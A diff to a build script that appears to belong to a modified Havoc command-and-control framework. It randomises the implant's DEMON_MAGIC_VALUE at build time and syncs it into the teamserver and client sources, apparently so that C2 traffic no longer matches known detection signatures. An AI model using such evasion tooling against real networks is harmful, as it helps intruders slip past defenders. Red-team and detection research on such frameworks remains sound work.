@@ -670,6 +670,45 @@ def verify_mappings(seed):
 
 
 # ============================================================================
+# Cross-file Magic Value Sync
+# ============================================================================
+
+def _sync_magic_value(magic_hex, script_dir):
+    """Sync DEMON_MAGIC_VALUE across teamserver (commands.go) and client (Service.cc).
+
+    This ensures the polymorphic magic value stays consistent across all three
+    components: payload (Defines.h), teamserver, and client.
+    """
+    import re
+
+    repo_root = os.path.abspath(os.path.join(script_dir, "..", "..", ".."))
+
+    # Teamserver: commands.go
+    commands_go = os.path.join(repo_root, "teamserver", "pkg", "agent", "commands.go")
+    if os.path.exists(commands_go):
+        content = open(commands_go).read()
+        updated = re.sub(
+            r'DEMON_MAGIC_VALUE\s*=\s*0x[0-9A-Fa-f]+',
+            f'DEMON_MAGIC_VALUE = {magic_hex}',
+            content
+        )
+        open(commands_go, 'w').write(updated)
+        print(f"  [+] Synced magic value to {commands_go}")
+
+    # Client: Service.cc
+    service_cc = os.path.join(repo_root, "client", "src", "Havoc", "Service.cc")
+    if os.path.exists(service_cc):
+        content = open(service_cc).read()
+        updated = re.sub(
+            r'DemonMagicValue\s*=\s*0x[0-9A-Fa-f]+',
+            f'DemonMagicValue = {magic_hex.lower()}',
+            content
+        )
+        open(service_cc, 'w').write(updated)
+        print(f"  [+] Synced magic value to {service_cc}")
+
+
+# ============================================================================
 # Code Generation
 # ============================================================================
 
@@ -703,8 +742,12 @@ def generate_defines_h(seed):
 
     # Replace DEADBEEF with build-time random value
     magic = random.randint(0x10000000, 0xFFFFFFFE)
-    lines.append(f"#define DEMON_MAGIC_VALUE 0x{magic:08X}")
+    magic_hex = f"0x{magic:08X}"
+    lines.append(f"#define DEMON_MAGIC_VALUE {magic_hex}")
     lines.append("")
+
+    # Sync magic value to teamserver (commands.go) and client (Service.cc)
+    _sync_magic_value(magic_hex, os.path.dirname(os.path.abspath(__file__)))
 
     # Static defines (unchanged)
     static_defs = [
